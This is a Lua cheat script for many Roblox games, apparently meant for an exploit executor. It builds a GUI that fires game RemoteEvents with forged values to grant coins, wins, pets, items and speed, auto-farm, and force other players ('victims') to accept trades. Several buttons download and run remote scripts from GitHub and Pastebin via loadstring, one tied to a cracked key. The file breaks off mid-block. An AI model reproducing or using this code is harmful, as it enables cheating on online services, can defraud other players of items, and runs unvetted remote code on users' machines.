if game.PlaceId == 13822889 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("AzureHub Read Desc", "Key: Azure_crackedlol", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/main/AzureHub.lua",true))()
    end)
end

if game.PlaceId == 1365404657 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewTextBox("Join Any Flock", "Join Any Flock Without Perms", function(Flock)
    local args = {
        [1] = workspace.Flocks:FindFirstChild(Flock)
    }
    game:GetService("ReplicatedStorage").FlockEvents.JoinFlock:FireServer(unpack(args))
    end)
end

if game.PlaceId == 5712833750 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewTextBox("OP Autofarm", "VERY OP", function(delay)
    OPAutofarm = true
    while OPAutofarm == true do
        local args = {
            [1] = workspace.Eggs.Egg1
        }
        game:GetService("ReplicatedStorage").EggEvent:FireServer(unpack(args))
        wait(delay)
        end  
    end)

MainSection:NewButton("Stop Autofarm", "stop dat lag", function()
    OPAutofarm = false
    end)

MainSection:NewButton("more characters", "gives a couple characters", function()
    game:GetService("ReplicatedStorage").TreasureEvent:FireServer(workspace.Treasures.Treasure1)
    wait(0.1)
    game:GetService("ReplicatedStorage").TreasureEvent:FireServer(workspace.Treasures.Treasure2)
    wait(0.1)
    game:GetService("ReplicatedStorage").TreasureEvent:FireServer(workspace.Treasures.Treasure3)
    wait(0.1)
    game:GetService("ReplicatedStorage").TreasureEvent:FireServer(workspace.Treasures.Treasure4)
    wait(0.1)
    game:GetService("ReplicatedStorage").TreasureEvent:FireServer(workspace.Treasures.Treasure5)
    end)
end

if game.PlaceId == 8372375635 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("AFK Dream", "AutoFarm", function()
    AFKDream = true
    while AFKDream == true do
        game:GetService("ReplicatedStorage").Events.Sell:FireServer()
        local args = {
            [1] = true
        }
        game:GetService("ReplicatedStorage").Events.Sleep:FireServer(unpack(args))
        game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.E,false,game)
        wait(0.3)
        end  
    end)

MainSection:NewButton("Stop AFK Dream", "Stops the Autofarm", function()
    AFKDream = false
    game:GetService("ReplicatedStorage").Events.Sell:FireServer()
    local args = {
        [1] = false
    }
    game:GetService("ReplicatedStorage").Events.Sleep:FireServer(unpack(args))
    end)
end

if game.PlaceId == 10429088113 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewTextBox("Equipt any pet", "VERY OP", function(PetToEquipt)
    local args = {
        [1] = PetToEquipt
    }
    game:GetService("ReplicatedStorage").equipPet:FireServer(unpack(args))
    end)
end

if game.PlaceId == 5813165034 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("Max snowbar", "VERY OP", function()
    MaxSnowbar = true
    while MaxSnowbar == true do 
        game:GetService("ReplicatedStorage").Remotes.SnowBar:FireServer()
        wait(Tick)
    end
    end)

MainSection:NewButton("Stop snowbar", "NoMoreSnow", function()
    MaxSnowbar = false
    end)
end

if game.PlaceId == 9662949425 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewTextBox("Max Bone", "put the max bones in textbox", function(MaxBone)
end)

MainSection:NewButton("Do Max Bone", "put the max bones in textbox", function()
    local args = {
        [1] = MaxBone,
        [2] = MaxBone
    }
    workspace.AddBones:FireServer(unpack(args))
    end)
end

if game.PlaceId == 10758955211 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("Auto Win", "Very OP", function()
    AutoWin = true
    while AutoWin == true do
    game:GetService("ReplicatedStorage").RemoteEvents.RewardWins:FireServer()
    wait(0.1)
    end
    end)

MainSection:NewButton("Stop Win", "E", function()
    AutoWin = false
    end)
end

if game.PlaceId == 8321875194 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewTextBox("Get Coins", "OP", function(Coinss)
        local args = {
            [1] = Coinss
        }
        game:GetService("ReplicatedStorage").GiveCoin:FireServer(unpack(args))    
    end)
end

if game.PlaceId == 9173489535 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewTextBox("Get Coins", "OP", function(FliCoin)
    local args = {
        [1] = FliCoin
    }
    game:GetService("ReplicatedStorage").RemoteEvents.UpdateCoins:FireServer(unpack(args))  
    end)
end

if game.PlaceId == 10676523834 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("Auto Win", "Very OP", function()
    AutoWins = true
    while AutoWins == true do
        local args = {
            [1] = "CheckAdd",
            [2] = 14,
            [3] = 14,
            [4] = 14
        }
        game:GetService("ReplicatedStorage").RemoteEvents.Star_RemoteEvent:FireServer(unpack(args))
        wait(0.001)        
    end
    end)

MainSection:NewButton("Stop Win", "E", function()
    AutoWins = false
    end)
end

if game.PlaceId == 10827143707 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("Auto Bean", "Very OP", function()
    AutoBean = true
    while AutoBean == true do
        local args = {
            [1] = math.random
        }
        game:GetService("ReplicatedStorage").Remotes.DialogInteraction:FireServer(unpack(args))
    wait(tick)
    end
    end)

MainSection:NewButton("Stop Bean", "E", function()
    AutoBean = false
    end)
end

if game.PlaceId == 7026828578 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("Auto Speed", "Very OP", function()
    AutoRebSped = true
    while AutoRebSped == true do
        local args = {
            [1] = math.huge,
            [2] = 20
        }
        game:GetService("ReplicatedStorage").GlobalFunctions.AddPlayerSpeed:FireServer(unpack(args))    
        game:GetService("ReplicatedStorage").GlobalFunctions.RebirthPlayerCallFromClient:FireServer()
    wait(BigTick)
    end
    end)

MainSection:NewButton("Stop Speed", "EE", function()
    AutoRebSped = false
    end)

MainSection:NewTextBox("Add Speed", "OP", function(AddSpeed)
    local args = {
        [1] = AddSpeed,
        [2] = 20
    }
    game:GetService("ReplicatedStorage").GlobalFunctions.AddPlayerSpeed:FireServer(unpack(args))    
    end)

MainSection:NewButton("Fix Speed", "FixesSpeed", function()
    local args = {
        [1] = math.huge,
        [2] = 20
    }
    game:GetService("ReplicatedStorage").GlobalFunctions.AddPlayerSpeed:FireServer(unpack(args))    
    game:GetService("ReplicatedStorage").GlobalFunctions.RebirthPlayerCallFromClient:FireServer()
    end)
end

if game.PlaceId == 10577425443 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("Auto Win", "Very OP", function()
    AutoDoWin = true
    while AutoDoWin == true do
        game:GetService("ReplicatedStorage").RF.GetWin:InvokeServer()
    wait(Tick)
    end
    end)

MainSection:NewButton("Stop Win", "E", function()
    AutoDoWin = false
    end)
end

if game.PlaceId == 9992339729 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewTextBox("Points for Answer", "For TextBox Below", function(BlocksAmount)
    BlocksError = false
    Blocks = BlocksAmount
    Verify = Blocks
    Verify = Verify:gsub("-", "")
    Verify = Verify:gsub(" ", "")
    Verify = Verify:gsub("0", "")
    Verify = Verify:gsub("1", "")
    Verify = Verify:gsub("2", "")
    Verify = Verify:gsub("3", "")
    Verify = Verify:gsub("4", "")
    Verify = Verify:gsub("5", "")
    Verify = Verify:gsub("6", "")
    Verify = Verify:gsub("7", "")
    Verify = Verify:gsub("8", "")
    Verify = Verify:gsub("9", "")
    VerifyNumber = #Verify
    if VerifyNumber == 0 then
        Blocks = Blocks:gsub(" ", "")
        Verify = ""
        BlocksError = false
    else
        print('[Error]: String "Blocks" has a INVALID Character. Please DoubleCheck. Blocks Will be Default')
        BlocksError = true
        Blocks = 0
        end
    end)

MainSection:NewTextBox("Sumbmit Answer", "ANSWER HERE", function(Answer)
    Answer = Answer:gsub(" ", "")
    Answer = Answer:upper(Answer)
    if BlocksError == true then
        local args = {
            [1] = Answer,
            [2] = #Answer
        }
        game:GetService("ReplicatedStorage").SubmittedAnswer:FireServer(unpack(args))
    else
        local args = {
            [1] = Answer,
            [2] = Blocks
        }
        game:GetService("ReplicatedStorage").SubmittedAnswer:FireServer(unpack(args))
        end
    end)
end

if game.PlaceId == 4036494886 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("OP Gui", "Very OP", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/Proxima-Hub/main/Main.lua"))()
    end)
end

if game.PlaceId == 10868496812 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")
MainSection:NewTextBox("GetMone", "1 is abt 90-250", function(EggMoney)
    HalfEggMoney = EggMoney/2
    TycoonNumber = 0
    repeat
    local args = {
        [1] = TycoonNumber,
        [2] = {
            ["Event"] = "BuyRate",
            ["Props"] = {
                ["Amount"] = HalfEggMoney
            }
        }
    }
    game:GetService("ReplicatedStorage").ReplicaRemoteEvents.Replica_ReplicaSignal:FireServer(unpack(args))
    --FixMone
    local args = {
        [1] = TycoonNumber,
        [2] = {
            ["Event"] = "BuyRate",
            ["Props"] = {
                ["Amount"] = -HalfEggMoney
            }
        }
    }
    game:GetService("ReplicatedStorage").ReplicaRemoteEvents.Replica_ReplicaSignal:FireServer(unpack(args))
    local args = {
        [1] = TycoonNumber,
        [2] = {
            ["Event"] = "BuyRate",
            ["Props"] = {
                ["Amount"] = -HalfEggMoney
            }
        }
    }
    game:GetService("ReplicatedStorage").ReplicaRemoteEvents.Replica_ReplicaSignal:FireServer(unpack(args))
    TycoonNumber = TycoonNumber + 1
    until TycoonNumber == 9
    TycoonNumber = 0
    end)
end

if game.PlaceId == 9297410766 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("HitBall", "Hits ball with max power", function()
    local args = {
        [1] = "yeet",
        [2] = 1.04,
        [3] = "GetALifeKid"
    }
    game:GetService("Players").LocalPlayer.Character.Act:FireServer(unpack(args))    
    end)

MainSection:NewDropdown("UpgradeType", "Select Upgrade Type", {"Uniform", "Cleats", "Hat", "Ball"}, function(UT)
    UpgradeType = UT
    end)

MainSection:NewTextBox("EquiptUpgrade", "VERY OP", function(Upgrade)
    local args = {
        [1] = "Equip",
        [2] = UpgradeType,
        [3] = Upgrade,
        [4] = "GetALifeKid"
    }
    game:GetService("ReplicatedStorage").Action:FireServer(unpack(args))    
    end)
end

if game.PlaceId == 10631181587 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("gUI", "vERY oP", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/SleeksScripts/Stone-Miner-Simulator-2-Script/main/Script'))()  
    end)
end

if game.PlaceId == 9648883891 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewTextBox("Get Money", "VERY OP", function(GCOIN) 
    local args = {
        [1] = GCOIN
    }
    game:GetService("ReplicatedStorage").RemoteObjects.DanceGameCash:FireServer(unpack(args))
    end)
end

if game.PlaceId == 10631181587 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("GetDayRewards", "VERY OP", function()
    local Day = 0
    repeat
        local args = {
            "get_seven_day_reward",
            {
                ["1"] = Day
            }
        }
        game:GetService("ReplicatedStorage").RemoteFunction:InvokeServer(unpack(args))
        Day = Day + 1
    until Day == 9
end)


MainSection:NewButton("GAMEPASSES", "VERY OP", function()   
    for x = 1, 7 do
        local A_1 = "get_seven_day_reward"
        local A_2 = {["1"] = x}
        local Event = game:GetService("ReplicatedStorage").RemoteFunction
        Event:InvokeServer(A_1, A_2)
        wait()
    end
    
    for _, v in pairs(game:GetService("Workspace").Code:GetChildren()) do
        local A_1 = "redeem_code"
        local A_2 = {
            ["1"] = v.SurfaceGui.TextLabel.Text
            }
        local Event = game:GetService("ReplicatedStorage").RemoteFunction
        Event:InvokeServer(A_1, A_2)
    end
        
    for _, v in pairs(game:GetService("Workspace").Code2:GetChildren()) do
        local A_1 = "redeem_code"
        local A_2 = {
            ["1"] = v.SurfaceGui.TextLabel.Text
        }
        local Event = game:GetService("ReplicatedStorage").RemoteFunction 	Event:InvokeServer(A_1, A_2)
        end
    end)
end

if game.PlaceId == 5740246170 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("AutoBuild", "op", function()
    local env = getgenv()

    env.Settings = {
        ['AutoAddBricks'] = true;
    }

    local Settings = env.Settings

    env.Players = game:GetService("Players")
    env.RunService = game:GetService("RunService")
    env.lp = Players['LocalPlayer']

    local function getTower()
        for index, value in next, workspace:GetChildren() do 
            if value.Name == "Tower" and value.Owner.Value == lp then 
                return value 
            end
        end
    end

    local function AddBricksPerSecond(Tower)
        local Bricks = lp.leaderstats.Bricks.Value
        local left = Tower.PurchaseUpgradeButtonLeft or nil 
        local right = Tower.PurchaseUpgradeButtonRight or nil 
        if not left or not right then return end
        

        local price = tonumber( string.split(left.Head.ShopGui.Frame.Price.Text," ")[1] )
        

        if Bricks > price then 
            Bricks = Bricks - price 
            lp.Character.PrimaryPart.CFrame = left.Head.CFrame
            wait()
            firetouchinterest(lp.Character.PrimaryPart, left.Head, 0)
            firetouchinterest(lp.Character.PrimaryPart, left.Head, 1)
        end 
        
        price = tonumber( string.split(right.Head.ShopGui.Frame.Price.Text," ")[1] )
        
        if Bricks > price then 
            lp.Character.PrimaryPart.CFrame = right.Head.CFrame
            wait()
            firetouchinterest(lp.Character.PrimaryPart, right.Head, 0)
            firetouchinterest(lp.Character.PrimaryPart, right.Head, 1)
            
        end 
        
    end

    local function AddBricks(Tower)
        fireclickdetector(Tower.ClickDetector) 
    end

    local tower = getTower()

    while Settings.AutoAddBricks do 
        RunService.Heartbeat:wait()
        AddBricks(tower)
        AddBricksPerSecond(tower)
        end
    end)

MainSection:NewButton("StopBuild", "E", function()
    env.Settings = {
        ['AutoAddBricks'] = true;
    }
    end)
end

if game.PlaceId == 10631181587 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("wINN aLL oBBY", "vERY oP", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/SleeksScripts/Stone-Miner-Simulator-2-Script/main/Script'))()  
    end)
end

if game.PlaceId == 10631181587 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("Winn All Obby", "Ez?", function()
setsimulationradius(1000,1000)
    _G.test = true
    while _G.test do
        wait()
    for i,v in pairs(game.Workspace.Tycoons[game.Players.LocalPlayer.Team.Name].Gumballs:GetChildren()) do
        if v.Name == "Gumball" and isnetworkowner(v) then
            v.CFrame = Game.Workspace.Tycoons[game.Players.LocalPlayer.Team.Name].Interact.Guminator.Converter.CFrame
        end
    end
end
end)
end

if game.PlaceId == 10859465529 then
-- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("Safe", "Save Urself. WAIT AFTER USE", function()
    game:GetService("ReplicatedStorage").RemoteCalls.GameSpecific.Title.ReturnToTitleScreen:InvokeServer()
    wait(5)
    local ts = game:GetService("TeleportService")
    local p = game:GetService("Players").LocalPlayer
    ts:Teleport(game.PlaceId, p)
    end)
end

if game.PlaceId == 9677464361 then
    -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")

MainSection:NewButton("AutoFarm", "Very OP", function()
    AutoFarms = true
    while AutoFarms == true do
        local args = {
            [1] = "Shoot",
            [2] = "Green"
        }
        game:GetService("ReplicatedStorage").RF:InvokeServer(unpack(args))
              
        local args = {
            [1] = "Made"
        }
        game:GetService("ReplicatedStorage").RE:FireServer(unpack(args))        
        wait(0.1)
    end
    end)

MainSection:NewButton("Stop Win", "E", function()
    AutoFarms = false
    end)

    if game.PlaceId == 10462101644 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")
    
MainSection:NewTextBox("ChangeHeight", ".........", function(Height)
    local args = {
        [1] = "ChangeHeight",
        [2] = Height,
        [3] = false
    }
    game:GetService("ReplicatedStorage").Events.Props.PropRF:InvokeServer(unpack(args))
        end)
    end

MainSection:NewTextBox("ChangeWheight", ".........", function(Wheight)
    local args = {
         [1] = "ChangeWheight",
        [2] = Wheight,
        [3] = false
    }
    game:GetService("ReplicatedStorage").Events.Props.PropRF:InvokeServer(unpack(args))
        end)
    end

if game.PlaceId == 10266345621 then
        -- MAIN
RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")
    
    MainSection:NewButton("Auto SnowBall", "Very OP", function()
        AutoSnowBall = true
        while AutoSnowBall == true do
            game:GetService("ReplicatedStorage").Events.Ball.CollectSnow:FireServer()
        wait(Tick)
        end
    end)
    
    MainSection:NewButton("Stop Snow", "E", function()
        AutoSnowBall = false
    end)
end

if game.PlaceId == 10266345621 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("Auto SnowBall", "Very OP", function()
        AutoSnowBall = true
        while AutoSnowBall == true do
        game:GetService("ReplicatedStorage").Events.CollectSnow:FireServer()
        wait(Tick)
        end
    end)

    MainSection:NewButton("Stop Snow", "E", function()
        AutoSnowBall = false
    end)

    MainSection:NewButton("AntiPush", "Very OP", function()
        AntiPush = true
        while AntiPush == true do
        local args = {
            [1] = true
        }
        game:GetService("ReplicatedStorage").Events.JumpState:FireServer(unpack(args))
        wait(Tick)
        end
    end)

    MainSection:NewButton("Stop AntiPush", "E", function()
        AntiPush = false
    end)
end

if game.PlaceId == 8216162783 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewTextBox("ID.HoldAnyItem", "Use the ID 1000+", function(TOOLID)
        local args = {
            [1] = "TakeTool",
            [2] = TOOLID,
            [3] = true
        }
        game:GetService("ReplicatedStorage").Events.PickAndDrop.PickAndDropRE:FireServer(unpack(args))
        
    end)

    MainSection:NewButton("GUI", "E", function()
        loadstring(game:HttpGet('https://pastebin.com/raw/vhNFzwzE'))()
    end)
end

if game.PlaceId == 10903978962 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewTextBox("Get wool LVL", "dont put big number!!!", function(WoolLVL)
        local args = {
            [1] = WoolLVL,
            [2] = Vector3.new(348.5956726074219, 3.312828779220581, 596.522705078125)
        }

        game:GetService("ReplicatedStorage").Signals.RemoteEvents.GetWoolRemote:FireServer(unpack(args))
    end)
end

if game.PlaceId == 394846350 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewTextBox("Get JP", "dont put big number!!!", function(JPR)
        local args = {
            [1] = JPR,
            [2] = 2
        }
        game:GetService("ReplicatedStorage").GlobalFunctions.AddPlayerSpeed:FireServer(unpack(args))
    end)
end

if game.PlaceId == 9745792410 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("Auto EXP Pet", "put pet", function()
        AutoExpPets = true
        while AutoExpPets == true do
        local args = {
            [1] = {
                ["PetEvolution"] = "Normal",
                ["PetName"] = AutoExpPet
            }
        }
        game:GetService("ReplicatedStorage").GameClient.Events.RemoteFunction.GetGlobalPetCount:InvokeServer(unpack(args))
        local args = {
            [1] = {
                ["PetEvolution"] = "Shiny",
                ["PetName"] = AutoExpPet
            }
        }
        game:GetService("ReplicatedStorage").GameClient.Events.RemoteFunction.GetGlobalPetCount:InvokeServer(unpack(args))
        end
    end)

MainSection:NewButton("stop Auto EXP Pet", "put pet", function()
    AutoExpPets = false
end)

MainSection:NewTextBox("DoTrade", "put victim", function(DoTradeVictim)
        local args = {
            [1] = DoTradeVictim,
            [2] = "Accept"
        }
        game:GetService("ReplicatedStorage").GameClient.Events.RemoteEvent.AcceptDeclineTrade:FireServer(unpack(args))
        local args = {
            [1] = localplayer,
            [2] = "Accept"
        }
        game:GetService("ReplicatedStorage").GameClient.Events.RemoteEvent.AcceptDeclineTrade:FireServer(unpack(args))
    end)
end

if game.PlaceId == 4133011719 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("Auto Score", "O.P.", function()
    AutoScore = true
    while AutoScore == true do
        game:GetService("ReplicatedStorage").Events.ScoreUpdate:FireServer()
        end
    end)

MainSection:NewButton("Stop Auto Score", ".P.O", function()
    AutoScore = false
    end)
end

if game.PlaceId == 9558459273 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("Upgrade Juice", "Dosent Show On GUI", function()
    local args = {
        [1] = "Juice"
    }
        game:GetService("ReplicatedStorage").MainEvents.OpeningUpgrade:FireServer(unpack(args))
    end)

MainSection:NewButton("Upgrade Wrench", "Dosent Show On GUI", function()
    local args = {
        [1] = "Wrench"
    }
        game:GetService("ReplicatedStorage").MainEvents.OpeningUpgrade:FireServer(unpack(args))
    end)

MainSection:NewTextBox("ArmorWithProp", "Dosent Show On GUI", function(PropLevel)
    local args = {
        [1] = PropLevel
    }
    game:GetService("ReplicatedStorage").MainEvents.ReceivingArmor:FireServer(unpack(args))
    end)
end

if game.PlaceId == 2693739238 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewTextBox("Loot ID", "VERYOP", function(LootId)
    local args = {
        [1] = LootId
    }
    game:GetService("ReplicatedStorage").Events.Loot.RequestLoot:FireServer(unpack(args))
    end)

MainSection:NewTextBox("FakeHold", "VERYOP", function(FakeHoldItem)
    FakeHoldItemCaps = string.upper(FakeHoldItem)
    local args = {
        [1] = FakeHoldItemCaps
    }
    game:GetService("ReplicatedStorage").RemoteEvents.setup:FireServer(unpack(args))
    end)

MainSection:NewTextBox("Select Gun", "VERYOP", function(SelectedGun)
    SelectedGunAll = SelectedGun
    end)

MainSection:NewButton("Buy Gun", "VERYOP", function()
    local args = {
        [1] = SelectedGunAll
    }
    game:GetService("ReplicatedStorage").Events.GunShop.RequestBuy:FireServer(unpack(args))
    end)

MainSection:NewButton("Escape Jail", "VERYOP", function()
    Game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1327.28125, 12.787861824035645, 31.134889602661133)
    end)

MainSection:NewButton("Sell All", "VERYOP", function()
    local args = {
        [1] = 3
    }
    game:GetService("ReplicatedStorage").Events.Shop.RequestSellAll:FireServer(unpack(args))
    end)
end

if game.PlaceId == 9105971785 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewTextBox("Get Trail/Item", "VERYOP", function(ItemTrail)
    local args = {
        [1] = game:GetService("ReplicatedStorage").Profiles.localplayer.Inventory.Items,
        [2] = ItemTrail,
        [3] = false,
        [4] = 0
    }
    game:GetService("ReplicatedStorage").Shared.Inventory.RewardItem:InvokeServer(unpack(args))
    end)
end

if game.PlaceId == 7476406054 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("Get AdminCrystalTrail", "VERYOP", function()
    local args = {
        [1] = "Buy",
        [2] = "AdminCrystal"
    }
    game:GetService("Players").LocalPlayer.BuyTrail:FireServer(unpack(args))
    local args = {
        [1] = "Equip",
        [2] = "AdminCrystal"
    }
    game:GetService("Players").LocalPlayer.BuyTrail:FireServer(unpack(args))
    end)
end

if game.PlaceId == 6892252562 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("AutoCollectDrops", "VERYOP", function()
    AutoCollectDrop = true
    while AutoCollectDrop == true do
        for i,v in pairs(game:GetService("Workspace").Debris.Pickups:GetDescendants()) do
            if v.ClassName == "Part" then
                v.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0,0,100)
            end
        end
        wait(.1)
        for i,v in pairs(game:GetService("Workspace").Debris.Pickups:GetDescendants()) do
            if v.ClassName == "Part" then
                v.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0,0,0)
            end
        end
        wait(.1)
    end
    end)

MainSection:NewButton("StopCollectDrops", "VERYOP", function()
    AutoCollectDrop = false
    end)
end

if game.PlaceId == 9486506804 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("AutoCoin", "VERYOP", function()
    AutoSoccerBall = true
    while AutoSoccerBall == true do
        game:GetService("ReplicatedStorage").BallHandler_OnKick:FireServer()
        local args = {
            [1] = workspace.Lobby.AdventureFootball.Courses.Course3.Coins.Coin,
            [2] = true
        }
        game:GetService("ReplicatedStorage").Zurich_OnCoinPickUpEvent:FireServer(unpack(args))
        local args = {
            [1] = workspace.Lobby.AdventureFootball.Courses.Course3.Coins.Coin,
            [2] = true
        }
        game:GetService("ReplicatedStorage").Zurich_OnCoinPickUpEvent:FireServer(unpack(args))
        local args = {
            [1] = {
                ["GameMode"] = "Minigolf",
                ["Name"] = "Course1",
                ["Position"] = Vector3.new(68.660400390625, 3.080204486846924, -340.1939697265625),
                ["Id"] = 1,
                ["IsLong"] = false,
                ["Goal"] = workspace.Courses.Adventure.TriggerSpawnBall1.GoalCourse3,
                ["Part"] = workspace.Courses.Adventure.TriggerSpawnBall1
            }
        }
        game:GetService("ReplicatedStorage").Minigolf_OnScore:FireServer(unpack(args))
        game:GetService("ReplicatedStorage").BallHandler_OnKickFinished:FireServer()
        end
    end)

MainSection:NewButton("Stop AutoCoin", "VERYOP", function()
    AutoSoccerBall = false
    end)
end

if game.PlaceId == 2726456994 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("AutoGrow", "VERYOP", function()
    AutoGrow = true
    while AutoGrow == true do
        timer = 0
        repeat
            workspace.Events.AddPoints:FireServer()
            workspace.Events.AddPoints:FireServer()
            workspace.Events.AddPoints:FireServer()
            workspace.Events.AddPoints:FireServer()
            workspace.Events.AddPoints:FireServer()
            timer = timer+1
        until timer == 1000
        wait(0.01)
        end
    end)

MainSection:NewButton("Stop AutoGrow", "VERYOP", function()
    AutoGrow = false
    end)
end

if game.PlaceId == 9107444852 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("AutoRebirth", "VERYOP", function()
    AutoSlapReb = true
    while AutoSlapReb == true do
        local args = {
            [1] = {
                [1] = 1
            }
        }
        game:GetService("ReplicatedStorage").Fwk.RemoteEvents.Rebirth:FireServer(unpack(args))
        wait(0.3)
        end
    end)

MainSection:NewButton("StopRebirth", "VERYOP", function()
    AutoSlapReb = false
    end)

MainSection:NewButton("AutoClick", "VERYOP", function()
    AutoSlap = true
    while AutoSlap == true do
        local args = {
            [1] = {}
        }
        game:GetService("ReplicatedStorage").Fwk.RemoteEvents.Click:FireServer(unpack(args))
        wait(0.005)
        end
    end)
    
MainSection:NewButton("Stop AutoClick", "VERYOP", function()
    AutoSlap = false
    end)
end

if game.PlaceId == 9107444852 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewTextBox("SpawnCar", "EX: 110_3", function(CarSpawn)
    local args = {
        [1] = CarSpawn
    }
    game:GetService("ReplicatedStorage").RemoteFunctions.Main.SpawnVehicle:InvokeServer(unpack(args))
    end)
end

if game.PlaceId == 10977918334 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewTextBox("Get wool LVL", "dont put big number!!!", function(WoolLVLS)
        local args = {
            [1] = WoolLVLS,
            [2] = Vector3.new(-310.0931701660156, 5.566789627075195, 2.98732328414917)
        }
        game:GetService("ReplicatedStorage").Signals.RemoteEvents.GetWoolRemote:FireServer(unpack(args))
    end)
end

if game.PlaceId == 10779604733 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("Pumkin2022", "Vry OP", function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2734.9917, 148.845978, 355.287109, 0.130346656, -0, -0.99146843, 0, 1, -0, 0.99146843, 0, 0.130346656)
        wait(0.001)
